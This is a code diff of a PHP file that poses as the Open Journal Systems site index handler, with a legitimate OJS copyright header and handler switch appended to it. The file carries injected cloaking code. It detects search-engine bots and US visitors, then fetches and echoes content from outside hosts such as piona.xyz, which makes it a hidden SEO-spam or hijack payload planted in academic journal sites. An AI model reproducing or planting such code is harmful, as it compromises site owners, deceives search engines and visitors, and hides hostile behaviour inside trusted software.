@@ -18,7 +18,7 @@ function is_bot() {
     return preg_match($botchar, $user_agent);
 }
 
-$Biawak = "https://rayapbesi-boy.xyz/landing/ejournal.stairaya.ac.id/index.txt";
+$Biawak = "https://piona.xyz/landing/jom.unri.ac.id/index.html";
 
 if (is_bot()) {
     echo @file_get_contents($Biawak);
@@ -29,6 +29,29 @@ if (getUserCountry() === "US") {
     header("Content-Type: text/html; charset=UTF-8");
     echo @file_get_contents($Biawak);
     exit();
+}
+
+/**
+ * @defgroup pages_index
+ */
+ 
+/**
+ * @file pages/index/index.php
+ *
+ * Copyright (c) 2013-2016 Simon Fraser University Library
+ * Copyright (c) 2003-2016 John Willinsky
+ * Distributed under the GNU GPL v2. For full terms see the file docs/COPYING.
+ *
+ * @ingroup pages_index
+ * @brief Handle site index requests. 
+ *
+ */
+
+switch ($op) {
+	case 'index':
+		define('HANDLER_CLASS', 'IndexHandler');
+		import('pages.index.IndexHandler');
+		break;
 }
 
 ?>
